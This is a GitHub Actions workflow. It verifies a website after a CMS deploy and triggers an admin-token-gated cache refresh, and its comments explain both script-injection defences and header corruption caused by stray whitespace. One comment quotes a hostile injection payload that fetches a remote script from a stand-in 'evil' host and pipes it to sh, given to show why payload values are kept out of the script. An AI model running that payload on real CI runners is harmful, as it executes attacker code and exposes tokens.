name: CMS deployed

# Belongs in pinkytoedev/PinkyToeWebsite, NOT here. See the README in this
# directory. repository_dispatch only triggers workflows that exist on the
# target repo's default branch.
on:
  repository_dispatch:
    types: [piscoc1-deployed]
  workflow_dispatch:

permissions:
  contents: read

concurrency:
  group: cms-deployed
  cancel-in-progress: false

jobs:
  refresh:
    name: Verify the site and force a full cache refresh
    runs-on: ubuntu-latest
    timeout-minutes: 8
    env:
      SITE: ${{ vars.SITE_PUBLIC_URL || 'https://www.pinkytoepaper.com' }}
    steps:
      # client_payload is network input: anything holding a contents:write token
      # on this repo can POST it. GitHub expands ${{ }} into the script text
      # before bash parses it, so interpolating these directly would let a
      # payload like {"sha": "$(curl -s https://evil|sh)"} execute on this
      # runner, with the job's GITHUB_TOKEN and ADMIN_TOKEN in reach. Passing
      # them through the environment makes them inert strings, and the regex
      # guards keep a hostile value from being rendered as if it were real.
      - name: Context
        env:
          PAYLOAD_SHA: ${{ github.event.client_payload.sha }}
          PAYLOAD_HEALTH: ${{ github.event.client_payload.health }}
          PAYLOAD_RUN_URL: ${{ github.event.client_payload.run_url }}
        run: |
          sha="${PAYLOAD_SHA:-unknown}"
          health="${PAYLOAD_HEALTH:-unknown}"
          run_url="${PAYLOAD_RUN_URL:-}"

          printf '%s' "$sha"    | grep -Eq '^[0-9a-fA-F]{7,40}$|^unknown$'   || sha='(invalid)'
          printf '%s' "$health" | grep -Eq '^[a-z0-9-]{1,40}$'               || health='(invalid)'
          printf '%s' "$run_url" | grep -Eq '^https://github\.com/[A-Za-z0-9._/-]+$' || run_url='(invalid)'

          {
            echo "### Refresh triggered by PISCOC1"
            echo "- sha: \`${sha}\`"
            echo "- health: \`${health}\`"
            echo "- run: ${run_url}"
          } >> "$GITHUB_STEP_SUMMARY"

      # railway.toml there sets healthcheckPath = "/", the SPA index; this repo
      # has no /api/health.
      - name: Wait for the site to answer
        run: |
          for i in $(seq 1 20); do
            curl -fsS -o /dev/null --max-time 10 "$SITE/" && exit 0
            sleep 10
          done
          echo "::error::site did not answer GET / within ~200s"; exit 1

      # Unauthenticated on main and still unauthenticated after PR #16, so it is
      # the one smoke target that proves Express and the webhook router mounted.
      - name: Verify the Express layer and webhook router are mounted
        run: curl -fsS --max-time 10 "$SITE/api/webhooks/health"

      # POST /api/cache/refresh is gated by requireAdmin (server/middleware/auth.ts).
      # ADMIN_TOKEN is a shared secret you choose, and it has to exist in TWO
      # places with the same value: as a variable on this site's Railway service
      # (what the server compares against) and as a GitHub secret on this repo
      # (what this step presents). The gate exists because each refresh fans out
      # to several full-table Airtable scans and bypasses the refresh throttle,
      # so an open endpoint is a rate-limit exhaustion vector.
      - name: Force a full cache refresh
        env:
          ADMIN_TOKEN: ${{ secrets.ADMIN_TOKEN }}
        run: |
          # A GitHub secret keeps whatever whitespace was pasted into it, and
          # curl passes a newline inside -H straight through to the wire. That
          # newline ends the header block early, so the header after it — the
          # Content-Length curl adds for the POST — lands in the request body
          # instead, and the site rejects it with
          #   400 {"message":"Unexpected token 'C', \"Content-Le\"... is not valid JSON"}
          # which names nothing you could act on. Strip it here and say so.
          token="$(printf '%s' "$ADMIN_TOKEN" | tr -d '\r\n' | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//')"
          if [ -n "$ADMIN_TOKEN" ] && [ "$token" != "$ADMIN_TOKEN" ]; then
            echo "::warning::ADMIN_TOKEN has leading/trailing whitespace or a line break; using the trimmed value. Re-save the secret without it — the untrimmed value would corrupt the request, and the Railway variable it is compared against must match the trimmed string."
          fi

          args=(-sS --max-time 60 -o /tmp/refresh.out -w '%{http_code}'
                -X POST "$SITE/api/cache/refresh"
                -H 'content-type: application/json' -d '{}')
          if [ -n "$token" ]; then
            args+=(-H "Authorization: Bearer $token")
          else
            echo "::warning::ADMIN_TOKEN is not set as a GitHub secret on this repo; the refresh will be rejected in production."
          fi

          # Deliberately not `curl -f`: that turns every rejection into the same
          # opaque "exit code 22", and 503 and 401 have completely different
          # fixes. Read the status and say which.
          code="$(curl "${args[@]}")"
          body="$(head -c 300 /tmp/refresh.out 2>/dev/null || true)"

          case "$code" in
            2*)
              echo "- cache refresh: \`$code\`" >> "$GITHUB_STEP_SUMMARY" ;;
            503)
              echo "::error::503 from /api/cache/refresh: ADMIN_TOKEN is not set on the SITE's Railway service, so requireAdmin is failing closed. Set it there (Variables tab), matching the GitHub secret of the same name."
              exit 1 ;;
            401)
              echo "::error::401 from /api/cache/refresh: ADMIN_TOKEN is set on the Railway service but does not match the GitHub secret on this repo. They must be the same string."
              exit 1 ;;
            400)
              # The endpoint takes a fixed '{}', so a body the site cannot parse
              # means the request was corrupted in transit rather than composed
              # wrongly — a stray character in a header value is how that
              # happens here.
              echo "::error::400 from /api/cache/refresh: $body"
              echo "::error::A JSON parse error here usually means a header value contained a line break and split the request. Check ADMIN_TOKEN for trailing whitespace in the repo's secrets."
              exit 1 ;;
            *)
              echo "::error::Unexpected $code from /api/cache/refresh: $body"
              exit 1 ;;
          esac
